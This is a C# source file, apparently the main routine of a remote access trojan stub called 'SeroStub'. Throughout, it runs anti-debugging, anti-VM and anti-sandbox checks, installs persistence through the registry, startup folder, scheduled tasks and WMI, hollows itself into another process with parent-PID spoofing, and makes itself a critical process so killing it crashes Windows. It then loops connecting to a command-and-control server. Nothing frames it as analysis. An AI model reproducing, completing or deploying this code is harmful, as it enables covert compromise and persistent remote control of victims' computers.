using System.Diagnostics;
using System.Runtime.InteropServices;

namespace SeroStub;

partial class Program
{
    private static Mutex? _mutex;

    public static void ReleaseMutex()
    {
        try { _mutex?.ReleaseMutex(); } catch { }
        _mutex?.Dispose();
        _mutex = null;
    }

    private static void ProtectionExit(string check)
    {
        StubLog.Info($"{check} triggered, exiting.");
    }

    [System.Diagnostics.Conditional("DEBUG")]
    private static void Breadcrumb(string msg)
    {
        StubLog.Info($"[Breadcrumb] {msg}");
    }

    private static bool IsAdmin()
    {
        try
        {
            using var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
            return new System.Security.Principal.WindowsPrincipal(identity)
                .IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
        }
        catch { return false; }
    }

    internal static void ReacquireMutex()
    {
        if (!Config.UseMutex) return;

        try
        {
            _mutex = new Mutex(true, Config.MutexName, out bool created);
            if (!created)
            {
                _mutex.WaitOne(3000);
            }
        }
        catch { }
    }

    [STAThread]
    static async Task Main()
    {
        // Guardian check: if launched as guardian, monitor parent and exit
        if (Protection.RunAsGuardianIfNeeded()) return;

        // Single instance (if mutex is enabled)
        if (Config.UseMutex)
        {
            _mutex = new Mutex(true, Config.MutexName, out bool created);
            if (!created) { Breadcrumb("EXIT: mutex already held"); return; }
        }

        bool admin = IsAdmin();
        Breadcrumb($"START admin={admin} path={Environment.ProcessPath}");

        // Anti-Protection checks FIRST (before any process manipulation)
        if (!ProcessHollowing.IsHollowedInstance())
        {
            // Anti-sandbox: short sleep to bypass fast-forward detection
            await Task.Delay(1500);

            if (Config.AntiDebug && Protection.IsDebuggerDetected()) { ProtectionExit("AntiDebug"); return; }
            if (Config.AntiVM && Protection.IsVirtualMachine()) { ProtectionExit("AntiVM"); return; }
            if (Config.AntiDetect && Protection.IsAnalysisEnvironment()) { ProtectionExit("AntiDetect"); return; }
            if (Config.AntiSandbox && Protection.IsSandbox()) { ProtectionExit("AntiSandbox"); return; }
        }

        // Persistence BEFORE hollowing (so Environment.ProcessPath = original exe)
        if (!ProcessHollowing.IsHollowedInstance())
        {
            bool hasPersist = Config.PersistRegistry || Config.PersistStartup || Config.PersistTask;
            if (hasPersist)
            {
                // Copy exe to a permanent location (AppData) so persistence survives
                // Pass isAdmin so we don't relaunch when elevated (would lose admin token)
                var installPath = Persistence.EnsureInstalled(Config.PersistName, admin, allowMultiInstance: !Config.UseMutex);
                if (installPath != null && Config.UseMutex)
                {
                    // We were copied to AppData and relaunched from there — exit this instance
                    // (only if mutex is enabled; multi-instance mode continues with both instances)
                    Breadcrumb($"EXIT: relaunching from {installPath}");
                    ReleaseMutex();
                    return;
                }
                // installPath == null means we're already running from the install dir (or admin mode)
                if (Config.PersistRegistry) Persistence.InstallRegistry(Config.PersistName);
                if (Config.PersistStartup) Persistence.InstallStartup(Config.PersistName);
                if (Config.PersistTask) Persistence.InstallScheduledTask(Config.PersistName);
            }
        }

        // Store real exe path before hollowing so the guardian can find it
        if (Config.EnableWatchdog && !ProcessHollowing.IsHollowedInstance())
        {
            var realPath = Environment.ProcessPath;
            if (!string.IsNullOrEmpty(realPath))
                Environment.SetEnvironmentVariable("SERO_EXE", realPath);
        }

        // Process hollowing: if enabled and we're NOT the hollowed instance, hollow and exit
        // Skip PPID spoofing when admin to preserve elevation token
        if (Config.EnableHollowing && !ProcessHollowing.IsHollowedInstance())
        {
            StubLog.Info($"Hollowing self into {Config.HollowTarget}...");

            // Release mutex BEFORE hollowing so the child process can acquire it
            ReleaseMutex();

            int pid = ProcessHollowing.HollowSelf(Config.HollowTarget, skipPpidSpoof: admin);
            if (pid > 0)
            {
                Breadcrumb($"Hollowed OK PID={pid}, exiting parent.");
                return;
            }

            // Hollowing failed — reacquire mutex and continue as normal
            Breadcrumb("Hollowing failed, continuing.");
            ReacquireMutex();
            StubLog.Error("Hollowing failed, continuing as normal process.");
        }


        // Hide thread from debugger (only if AntiDebug is enabled)
        if (Config.AntiDebug)
            Protection.HideFromDebugger();

        // Anti-Kill: mark as critical process (BSOD if killed, requires admin)
        if (Config.AntiKill && admin)
            Protection.SetCriticalProcess();

        // Watchdog: DACL + guardian process + startup surveillance
        // Works with or without hollowing — guardian finds exe via installed path or original ProcessPath
        if (Config.EnableWatchdog)
        {
            Protection.ProtectProcessDacl();
            Protection.StartAntiKillWatchdog();
            bool hasPersist2 = Config.PersistRegistry || Config.PersistStartup || Config.PersistTask;
            if (hasPersist2)
            {
                Persistence.StartWatchdog(Config.PersistName);
                var wmiExePath = Persistence.GetInstalledPath(Config.PersistName) ?? Environment.ProcessPath;
                if (!string.IsNullOrEmpty(wmiExePath))
                    Protection.RegisterWmiPersistence(wmiExePath);
            }
        }

        Breadcrumb($"CONNECTING to {Config.Host}:{Config.Port}");
        // Auto-reconnect loop
        while (true)
        {
            try
            {
                StubLog.Info($"Connecting to {Config.Host}:{Config.Port}...");
                using var client = new TlsClient(Config.Host, Config.Port);
                await client.RunAsync(CancellationToken.None);

                // Server sent Disconnect or Uninstall — stop reconnecting
                if (!client.ShouldReconnect)
                {
                    StubLog.Info("Server requested stop, exiting.");
                    return;
                }

                StubLog.Info("Connection lost, will reconnect...");
            }
            catch (Exception ex)
            {
                StubLog.Error($"Connection error: {ex.GetType().Name}: {ex.Message}");
            }

            // Wait before reconnecting
            await Task.Delay(Config.ReconnectDelayMs);
        }
    }
}
